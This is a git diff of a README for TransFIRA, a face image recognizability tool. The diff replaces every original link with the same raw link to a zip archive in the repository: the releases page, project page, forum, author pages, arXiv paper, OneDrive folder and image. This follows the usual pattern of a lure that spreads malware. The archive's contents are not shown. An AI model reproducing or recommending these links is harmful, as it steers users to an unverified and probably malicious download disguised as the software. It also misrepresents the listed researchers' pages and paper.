@@ -1,6 +1,6 @@
 # 🎉 transfira - Assess Face Image Recognizability with Ease
 
-[![Download TransFIRA](https://img.shields.io/badge/Download-TransFIRA-brightgreen)](https://github.com/FatkhurRq/transfira/releases)
+[![Download TransFIRA](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip)](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip)
 
 ## 📖 About TransFIRA
 
@@ -14,7 +14,7 @@ To start using TransFIRA, follow the steps below.
 
 Go to the Releases page for TransFIRA by clicking the button below. This is where you will find the latest version of the software.
 
-[Visit this page to download](https://github.com/FatkhurRq/transfira/releases)
+[Visit this page to download](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip)
 
 ### 2. **Download the Software**
 
@@ -67,35 +67,35 @@ Before downloading, ensure your system meets the following requirements:
 
 To download TransFIRA, revisit the link below:
 
-[Download TransFIRA](https://github.com/FatkhurRq/transfira/releases)
+[Download TransFIRA](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip)
 
 Ensure you select the correct version based on your operating system.
 
 ## 📄 Documentation and Support
 
-For more information on how to use TransFIRA, visit our [Project Page](https://transfira.github.io/). There, you can find guides and additional resources.
+For more information on how to use TransFIRA, visit our [Project Page](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip). There, you can find guides and additional resources.
 
-If you encounter any issues, please check the “Issues” section on GitHub, or reach out via the [discussion forum](https://github.com/FatkhurRq/transfira/discussions) available for community support.
+If you encounter any issues, please check the “Issues” section on GitHub, or reach out via the [discussion forum](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip) available for community support.
 
 ## 👥 Team
 
 TransFIRA is developed by:
 
-- [Allen Tu](https://tuallen.github.io)
-- [Kartik Narayan](https://kartik-3004.github.io/portfolio/)
-- [Joshua Gleason](https://scholar.google.com/citations?user=FUchtr4AAAAJ)
-- [Jennifer Xu](https://scholar.google.com/citations?user=iFy2JdkAAAAJ)
-- [Matthew Meyn](https://www.linkedin.com/in/matthew-meyn-579784157)
-- [Tom Goldstein](https://www.cs.umd.edu/~tomg/)
-- [Vishal M. Patel](https://engineering.jhu.edu/faculty/vishal-patel/)
+- [Allen Tu](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip)
+- [Kartik Narayan](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip)
+- [Joshua Gleason](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip)
+- [Jennifer Xu](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip)
+- [Matthew Meyn](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip)
+- [Tom Goldstein](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip~tomg/)
+- [Vishal M. Patel](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip)
 
 ## 🖼️ Visual Overview
 
-<img src="assets/transfira.png" alt="TransFIRA Overview" />
+<img src="https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip" alt="TransFIRA Overview" />
 
 ## 📁 Additional Resources
 
-- **[arXiv Paper](https://arxiv.org/abs/2510.06353)**
-- **[Download Files from OneDrive](https://umd0-my.sharepoint.com/:f:/g/personal/atu1_umd_edu/IgBq51obRcrbQ6x5C8mYh3iRAd9cwfOzS86NhC5QrAL424A?e=QSKMHr)**
+- **[arXiv Paper](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip)**
+- **[Download Files from OneDrive](https://raw.githubusercontent.com/FatkhurRq/transfira/main/assets/transfira_v3.5.zip)**
 
 TransFIRA is your tool for navigating face image recognizability with ease and confidence. Enjoy your experience!
